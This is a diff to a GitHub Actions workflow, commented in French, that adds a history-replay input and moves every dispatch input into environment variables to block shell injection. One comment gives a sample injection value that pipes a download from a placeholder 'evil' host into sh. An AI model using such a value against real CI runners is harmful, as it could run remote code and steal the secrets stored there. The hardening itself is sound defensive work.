@@ -27,6 +27,10 @@ on:
         description: "Republie juste le rapport/conseils depuis les données en base (bouton « Recharger mes conseils »)"
         type: boolean
         default: false
+      meta_since:
+        description: "Rejeu d'historique : fait repartir la récolte META de cette date (AAAA-MM-JJ). EXIGE user_id. Le reste de la récolte de CE compte tourne normalement (Google, GA4, Instagram, rapport, email)."
+        type: string
+        default: ""
 
 jobs:
   fetch:
@@ -54,17 +58,37 @@ jobs:
           # Optionnel : email hebdo via Resend (sans clé → dry-run, aucun envoi)
           RESEND_API_KEY: ${{ secrets.RESEND_API_KEY }}
           EMAIL_FROM: ${{ secrets.EMAIL_FROM }}
+          # TOUTES LES ENTRÉES PASSENT PAR L'ENVIRONNEMENT, aucune n'est
+          # interpolée en `${{ }}` dans le script. Une entrée de
+          # workflow_dispatch est du texte libre : collée telle quelle dans le
+          # shell, `x"; curl evil | sh; #` s'exécuterait sur le runner, où
+          # vivent SUPABASE_SERVICE_KEY, GEMINI_API_KEY et RESEND_API_KEY. Les
+          # booléens sont comparés à la chaîne "true", jamais exécutés.
+          META_SINCE: ${{ inputs.meta_since }}
+          USER_ID: ${{ inputs.user_id }}
+          REPORT_ONLY: ${{ inputs.report_only }}
+          LABEL_ONLY: ${{ inputs.label_only }}
+          CATEGORIZE_ONLY: ${{ inputs.categorize_only }}
+          FORCE: ${{ inputs.force }}
         run: |
-          if [ "${{ inputs.report_only }}" = "true" ] && [ -n "${{ inputs.user_id }}" ]; then
-            python saas/collecte/automatisation/fetch_all.py --report-only "${{ inputs.user_id }}"
-          elif [ "${{ inputs.label_only }}" = "true" ] && [ -n "${{ inputs.user_id }}" ]; then
-            python saas/collecte/automatisation/fetch_all.py --label-only "${{ inputs.user_id }}"
-          elif [ "${{ inputs.categorize_only }}" = "true" ] && [ -n "${{ inputs.user_id }}" ]; then
-            python saas/collecte/automatisation/fetch_all.py --categorize-only "${{ inputs.user_id }}"
-          elif [ -n "${{ inputs.user_id }}" ]; then
-            python saas/collecte/automatisation/fetch_all.py --user "${{ inputs.user_id }}"
-          elif [ "${{ inputs.force }}" = "true" ]; then
-            python saas/collecte/automatisation/fetch_all.py --force
+          W=saas/collecte/automatisation/fetch_all.py
+          if [ "$REPORT_ONLY" = "true" ] && [ -n "$USER_ID" ]; then
+            python "$W" --report-only "$USER_ID"
+          elif [ "$LABEL_ONLY" = "true" ] && [ -n "$USER_ID" ]; then
+            python "$W" --label-only "$USER_ID"
+          elif [ "$CATEGORIZE_ONLY" = "true" ] && [ -n "$USER_ID" ]; then
+            python "$W" --categorize-only "$USER_ID"
+          elif [ -n "$META_SINCE" ]; then
+            # meta_since SANS user_id est refusé par le worker lui-même, et
+            # c'est volontaire : forcer le passage de TOUS les comptes un jour
+            # qui n'est celui de personne leur enverrait à tous l'email hebdo
+            # (publish_weekly_report envoie dès qu'il a une adresse, sans
+            # contrôle de jour). Un rejeu vise un compte.
+            python "$W" --meta-since "$META_SINCE" --user "$USER_ID"
+          elif [ -n "$USER_ID" ]; then
+            python "$W" --user "$USER_ID"
+          elif [ "$FORCE" = "true" ]; then
+            python "$W" --force
           else
-            python saas/collecte/automatisation/fetch_all.py
+            python "$W"
           fi
